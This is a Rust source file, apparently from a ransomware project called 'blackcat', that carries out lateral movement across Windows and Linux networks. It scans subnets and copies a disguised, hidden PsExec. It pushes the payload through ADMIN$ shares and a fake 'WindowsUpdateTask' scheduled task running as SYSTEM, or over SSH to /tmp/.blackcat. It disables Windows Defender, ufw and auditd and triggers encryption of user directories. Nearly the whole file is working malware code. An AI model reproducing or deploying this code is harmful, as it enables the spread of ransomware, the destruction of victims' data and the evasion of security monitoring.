// src/lateral_movement.rs
use std::process::Command;
use std::fs;
use log::{info, warn};
use std::net::{TcpStream, SocketAddr};
use std::time::Duration;

pub struct LateralMovement;

impl LateralMovement {
    // Копируем встроенный PsExec во временную директорию и запускаем
    #[cfg(target_os = "windows")]
    pub fn deploy_embedded_psexec() -> Result<String, String> {
        use std::env;
        
        // Получаем путь к текущему исполняемому файлу
        let current_exe = env::current_exe()
            .map_err(|e| format!("Failed to get current exe path: {}", e))?;
        let current_dir = current_exe.parent()
            .ok_or("Failed to get parent directory".to_string())?;
        
        // Путь к встроенному PsExec в assets
        let psexec_source = current_dir.join("assets").join("PsExec.exe");
        
        if !psexec_source.exists() {
            return Err("Embedded PsExec not found in assets folder".to_string());
        }
        
        // Копируем в временную директорию
        let temp_dir = env::temp_dir();
        let psexec_dest = temp_dir.join("svchostp.exe"); // Маскируем под системный процесс
        
        fs::copy(&psexec_source, &psexec_dest)
            .map_err(|e| format!("Failed to copy PsExec: {}", e))?;
        
        // Устанавливаем скрытый атрибут
        let _ = Command::new("cmd")
            .args(&["/c", "attrib", "+h", &psexec_dest.to_string_lossy()])
            .output();
        
        Ok(psexec_dest.to_string_lossy().to_string())
    }
    
    // Обнаружение активных хостов в сети
    pub fn discover_hosts(network: &str, start: u8, end: u8) -> Vec<String> {
        let mut hosts = Vec::new();
        let network_parts: Vec<&str> = network.split('.').collect();
        
        if network_parts.len() != 3 {
            warn!("Invalid network format: {}", network);
            return hosts;
        }
        
        let base = format!("{}.{}.{}", network_parts[0], network_parts[1], network_parts[2]);
        
        for i in start..=end {
            let ip = format!("{}.{}", base, i);
            
            // Пропускаем определенные IP адреса (например, Kali)
            if Self::should_skip_ip(&ip) {
                continue;
            }
            
            if Self::is_host_alive(&ip) {
                info!("Discovered active host: {}", ip);
                hosts.push(ip);
            }
        }
        
        hosts
    }
    
    fn should_skip_ip(ip: &str) -> bool {
        // Пропускаем IP адреса 192.168.53.1-10 (Kali и другие важные хосты)
        if ip.starts_with("192.168.53.") {
            if let Some(last_part) = ip.split('.').last() {
                if let Ok(num) = last_part.parse::<u8>() {
                    return num >= 1 && num <= 10;
                }
            }
        }
        false
    }
    
    fn is_host_alive(ip: &str) -> bool {
        // Проверяем стандартные порты Windows
        let windows_ports = [445, 135, 139, 3389];
        for &port in &windows_ports {
            if Self::check_port(ip, port, 500) { // 500ms timeout
                return true;
            }
        }
        false
    }
    
    fn check_port(ip: &str, port: u16, timeout_ms: u64) -> bool {
        let addr: SocketAddr = format!("{}:{}", ip, port)
            .parse()
            .unwrap_or_else(|_| "0.0.0.0:0".parse().unwrap());
        
        match TcpStream::connect_timeout(&addr, Duration::from_millis(timeout_ms)) {
            Ok(_) => true,
            Err(_) => false,
        }
    }
    
    // Основная функция для распространения по Windows сети
    #[cfg(target_os = "windows")]
    pub fn spread_via_psexec(
        target_hosts: Vec<String>,
        username: &str,
        password: &str,
        domain: &str
    ) -> Result<(), String> {
        // Развертываем встроенный PsExec
        let psexec_path = Self::deploy_embedded_psexec()?;
        
        // Получаем путь к нашему payload
        let payload_path = std::env::current_exe()
            .map(|p| p.to_string_lossy().to_string())
            .map_err(|e| format!("Failed to get current exe: {}", e))?;
        
        for host in target_hosts {
            info!("Attempting lateral movement to {}", host);
            
            // Формируем команду для PsExec
            let command = format!(
                "cmd /c \"copy \"{}\" \\\\{}\\ADMIN$\\System32\\WindowsPowerShell\\v1.0\\Modules\\ && \
                schtasks /create /s {} /ru SYSTEM /tn \"WindowsUpdateTask\" /tr \
                \\\"\\\\{}\\ADMIN$\\System32\\WindowsPowerShell\\v1.0\\Modules\\{}\\\" /sc daily /st 00:00 /f && \
                schtasks /run /s {} /tn \"WindowsUpdateTask\"\"",
                payload_path, host, host, host, 
                std::path::Path::new(&payload_path).file_name().unwrap().to_string_lossy(),
                host
            );
            
            // Запускаем PsExec с учетными данными
            let output = Command::new(&psexec_path)
                .args(&[
                    "\\\\", &host,
                    "-u", &format!("{}\\{}", domain, username),
                    "-p", password,
                    "-h", // Запуск с повышенными привилегиями
                    "-s", // Запуск от имени SYSTEM
                    "-d", // Не ждать завершения
                    "-c", // Копировать исполняемый файл на удаленный хост
                    &command
                ])
                .output();
            
            match output {
                Ok(result) => {
                    if result.status.success() {
                        info!("Successfully spread to {}", host);
                        
                        // Отключаем защиту на удаленном хосте
                        let _ = Self::disable_remote_defender(&host, username, password, domain);
                        
                        // Запускаем шифрование
                        let _ = Self::trigger_remote_encryption(&host, username, password, domain);
                    } else {
                        warn!("Failed to spread to {}: {}", host, 
                              String::from_utf8_lossy(&result.stderr));
                    }
                }
                Err(e) => {
                    warn!("PsExec failed for {}: {}", host, e);
                }
            }
        }
        
        // Удаляем временный PsExec
        fs::remove_file(&psexec_path).ok();
        
        Ok(())
    }
    
    #[cfg(target_os = "windows")]
    fn disable_remote_defender(host: &str, username: &str, password: &str, domain: &str) -> Result<(), String> {
        let psexec_path = Self::deploy_embedded_psexec()?;
        
        let disable_commands = vec![
            "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
            "powershell -Command \"Set-MpPreference -DisableBehaviorMonitoring $true\"",
            "powershell -Command \"Set-MpPreference -DisableScriptScanning $true\"",
            "powershell -Command \"Add-MpPreference -ExclusionPath 'C:\\'\"",
            "cmd /c \"sc stop WinDefend\"",
            "cmd /c \"sc config WinDefend start= disabled\"",
        ];
        
        for cmd in disable_commands {
            let _ = Command::new(&psexec_path)
                .args(&[
                    "\\\\", host,
                    "-u", &format!("{}\\{}", domain, username),
                    "-p", password,
                    "-h",
                    "-s",
                    cmd
                ])
                .output();
        }
        
        fs::remove_file(&psexec_path).ok();
        Ok(())
    }
    
    #[cfg(target_os = "windows")]
    fn trigger_remote_encryption(host: &str, username: &str, password: &str, domain: &str) -> Result<(), String> {
        let psexec_path = Self::deploy_embedded_psexec()?;
        
        // Запускаем шифрование на удаленном хосте
        let payload_name = std::env::current_exe()
            .ok()
            .and_then(|p| p.file_name().map(|n| n.to_string_lossy().to_string()))
            .unwrap_or_else(|| "blackcat.exe".to_string());
        
        let command = format!(
            "\\\\{}\\ADMIN$\\System32\\WindowsPowerShell\\v1.0\\Modules\\{} -encrypt C:\\Users",
            host, payload_name
        );
        
        let output = Command::new(&psexec_path)
            .args(&[
                "\\\\", host,
                "-u", &format!("{}\\{}", domain, username),
                "-p", password,
                "-h",
                "-s",
                "-d",
                &command
            ])
            .output();
        
        fs::remove_file(&psexec_path).ok();
        
        match output {
            Ok(result) => {
                if result.status.success() {
                    info!("Triggered encryption on {}", host);
                    Ok(())
                } else {
                    Err(format!("Failed to trigger encryption: {}", 
                          String::from_utf8_lossy(&result.stderr)))
                }
            }
            Err(e) => Err(format!("Failed to execute: {}", e)),
        }
    }
    
    // Получение учетных данных из системы
    #[cfg(target_os = "windows")]
    pub fn harvest_credentials() -> Vec<(String, String, String)> {
        use std::process::Command;
        
        let mut credentials = Vec::new();
        
        // Получаем текущего пользователя и домен
        let output = Command::new("cmd")
            .args(&["/c", "echo %USERNAME% & echo %USERDOMAIN%"])
            .output();
            
        if let Ok(result) = output {
            let stdout = String::from_utf8_lossy(&result.stdout);
            let lines: Vec<&str> = stdout.lines().collect();
            
            if lines.len() >= 2 {
                let username = lines[0].trim().to_string();
                let domain = lines[1].trim().to_string();
                
                // Пытаемся получить пароль из памяти (имитация)
                // Для PoC используем пустой пароль
                let password = "".to_string();
                
                credentials.push((username, password, domain));
            }
        }
        
        // Добавляем стандартные учетные записи для тестирования
        credentials.push(("Administrator".to_string(), "".to_string(), "".to_string()));
        credentials.push(("administrator".to_string(), "".to_string(), "".to_string()));
        
        credentials
    }
    
    // Linux распространение через SSH
    #[cfg(target_os = "linux")]
    pub fn spread_via_ssh(
        target_hosts: Vec<String>,
        ssh_keys: Vec<String>
    ) -> Result<(), String> {
        let payload_path = std::env::current_exe()
            .map(|p| p.to_string_lossy().to_string())
            .map_err(|e| format!("Failed to get current exe: {}", e))?;
        
        for host in target_hosts {
            for key_path in &ssh_keys {
                info!("Attempting SSH connection to {} with key {}", host, key_path);
                
                // Копируем payload на удаленный хост
                let scp_cmd = format!(
                    "scp -i {} -o StrictHostKeyChecking=no -o ConnectTimeout=5 {} {}:/tmp/.blackcat",
                    key_path, payload_path, host
                );
                
                let scp_output = Command::new("sh")
                    .args(&["-c", &scp_cmd])
                    .output();
                
                if let Ok(result) = scp_output {
                    if result.status.success() {
                        // Устанавливаем права и запускаем
                        let ssh_cmd = format!(
                            "ssh -i {} -o StrictHostKeyChecking=no {} 'chmod +x /tmp/.blackcat && \
                            /tmp/.blackcat -encrypt /home &>/dev/null &'",
                            key_path, host
                        );
                        
                        let ssh_output = Command::new("sh")
                            .args(&["-c", &ssh_cmd])
                            .output();
                            
                        if let Ok(result) = ssh_output {
                            if result.status.success() {
                                info!("Successfully deployed to {}", host);
                                
                                // Отключаем защиту
                                let disable_cmd = format!(
                                    "ssh -i {} -o StrictHostKeyChecking=no {} 'systemctl stop ufw 2>/dev/null; \
                                    systemctl stop aide 2>/dev/null; pkill -9 auditd 2>/dev/null'",
                                    key_path, host
                                );
                                
                                let _ = Command::new("sh")
                                    .args(&["-c", &disable_cmd])
                                    .output();
                            }
                        }
                    }
                }
            }
        }
        
        Ok(())
    }
}